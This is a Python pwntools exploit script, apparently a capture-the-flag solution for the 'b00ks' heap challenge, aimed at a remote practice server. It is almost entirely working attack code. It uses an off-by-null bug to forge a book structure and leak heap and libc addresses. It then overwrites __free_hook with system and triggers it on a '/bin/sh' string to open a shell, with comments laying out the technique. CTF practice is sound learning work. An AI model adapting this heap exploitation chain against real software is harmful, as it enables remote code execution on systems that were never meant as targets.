from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 26207)
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-amd64/libc-2.23.so')
elf = ELF('../b00ks')
# target = process('../b00ks')

def create(bookname_size, bookname, desc_size, desc):
    target.sendlineafter('> ', '1')
    target.sendlineafter(': ', str(bookname_size))
    target.sendlineafter(': ', bookname)
    target.sendlineafter(': ', str(desc_size))
    target.sendlineafter(': ', desc)


def delete(index):
    target.sendlineafter('> ', '2')
    target.sendlineafter('delete: ', str(index))


def edit(index, desc):
    # We can only send limited bytes of new description to the booklist because
    # it will keep track of the allocated size.
    target.sendlineafter('> ', '3')
    target.sendlineafter(': ', str(index))
    target.sendlineafter(': ', desc)


def printf():
    target.sendlineafter('> ', '4')


def change_author(author):
    target.sendlineafter('> ', '5')
    target.sendlineafter(': ', author)


'''
Roadmap 1 (Not universal):
  1. Since the address of author_name is adjacent to that of the heap array of books, we can use the off-by-null bug to replace the last byte of the first heap array and let it point to the nearest address ends with 00.
  2. Also note that when we first write 32 bytes to author_name, it will append an \x00 to indicate that the string ends there. However, allocating book 1 will replace the last \x00. So when we print author_name, the address of book1 will be leaked.
  3. So we can construct a fake book that resides in book1' description.
  4. How do we control the fake book? Yes, we can replace the last byte of book1's address, and let it point to its description field (The size of bookname and description can be determined by gdb debugger).
  5. Allocating a large memory chunk will make the allocator call the mmap(), which will maps to a memory space that has fixed offset to libc's base address (but this offset will change when env and libc.so.6 change).
'''

# Author name.
target.sendlineafter('name: ', b'a' * 0x20)

# By mallocting as follows, we make sure that the last byte of bookdesc's
# memory address is 0.
create(0xd0, 'aaaa', 0x20, 'bbbb')
# So the last byte of author_name will be overwritten by book 0's address.
# Then we could leak the address of book 0 because the 0 byte is now replaced
# by newly allocated book0 address' last byte!
printf()
target.recvuntil(b'a' * 0x20)
heap_addr = u64(target.recv(6).ljust(8, b'\x00'))
print('[+] The heap address is {}.'.format(hex(heap_addr)))

create(0x80, 'abcd', 0x60, 'abcd')
create(0x20, '/bin/sh\x00', 0x20, '/bin/sh\x00')
delete(2)

# Heap addr points to the data (header is skipped) of book1, so we don't need to add 0x10 to the offset.
# heap_addr + 0x180 + 0x50 is the address of book 3's name (book 1 ptr is changed so the offset is changed too).
payload = p64(0x1) + p64(heap_addr + 0x30) + p64(heap_addr + 0x180 + 0x50) + p64(0x20)
edit(1, payload)
change_author(b'a' * 0x20)
printf()

libc_base = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - \
            88 - 0x10 - libc.symbols['__malloc_hook']
libc.address = libc_base
free_hook = libc.sym['__free_hook']
system = libc.sym['system']
print('[+] The libc address is {}.'.format(hex(libc_base)))

payload = p64(free_hook) + b'\x00\x00' + b'\x20'
edit(1, payload)
edit(3, p64(system))
delete(3)

target.interactive()